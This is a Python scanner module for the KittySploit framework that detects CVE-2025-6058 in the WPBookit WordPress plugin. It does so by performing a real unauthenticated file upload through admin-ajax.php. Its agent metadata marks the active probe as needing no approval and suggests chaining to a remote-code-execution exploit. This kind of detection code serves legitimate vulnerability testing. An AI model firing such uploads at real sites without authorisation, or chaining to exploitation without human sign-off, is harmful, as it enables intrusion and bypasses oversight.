#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WPBookit <= 1.0.4 unauthenticated file upload (CVE-2025-6058)."""

import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "wpbookit"
_VULN_HIGH = (1, 0, 4)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "WPBookit CVE-2025-6058 file upload detect",
        "description": (
            "Detects CVE-2025-6058: WPBookit <= 1.0.4 accepts arbitrary uploads via "
            "admin-ajax route add_booking_type (wpb_ajax_post)."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2025-6058",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2025-6058",
            "https://github.com/Nxploited/CVE-2025-6058",
        ],
        "modules": ["exploits/multi/http/wpbookit_cve_2025_6058_upload_rce"],
        "tags": ["web", "scanner", "wordpress", "wpbookit", "file-upload", "cve-2025-6058"],
        "agent": {
            "risk": "active",
            "approval_required": False,
            "produces": ["risk_signals", "file_upload"],
            "chain": {
                "suggested_followups": ["exploits/multi/http/wpbookit_cve_2025_6058_upload_rce"],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)

    def _base(self) -> str:
        return self.wp_normalize_base_path(self.base_path or "/")

    def _join(self, suffix: str) -> str:
        root = self._base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{root}{suffix}" if root != "/" else suffix

    def run(self):
        version = self.wp_plugin_version(_PLUGIN, self._base()) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        marker = secrets.token_hex(4)
        fname = f"ks{secrets.token_hex(3)}"
        body = (
            f"------ksboundary\r\n"
            f'Content-Disposition: form-data; name="action"\r\n\r\nwpb_ajax_post\r\n'
            f"------ksboundary\r\n"
            f'Content-Disposition: form-data; name="route_name"\r\n\r\nadd_booking_type\r\n'
            f"------ksboundary\r\n"
            f'Content-Disposition: form-data; name="title"\r\n\r\n{marker}\r\n'
            f"------ksboundary\r\n"
            f'Content-Disposition: form-data; name="booking_type"\r\n\r\n{marker}\r\n'
            f"------ksboundary\r\n"
            f'Content-Disposition: form-data; name="cover_image_img"; filename="{fname}.txt"\r\n'
            f"Content-Type: text/plain\r\n\r\n{marker}\r\n"
            f"------ksboundary--\r\n"
        )
        post = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={"Content-Type": "multipart/form-data; boundary=----ksboundary"},
            data=body,
            allow_redirects=False,
        )
        if not post or post.status_code != 200:
            return False
        text = post.text or ""
        if "success" in text.lower() and "status" in text.lower():
            self.set_info(
                severity="critical",
                reason="CVE-2025-6058 — WPBookit add_booking_type upload accepted",
                path="/wp-admin/admin-ajax.php",
                cve="CVE-2025-6058",
            )
            return True
        return False
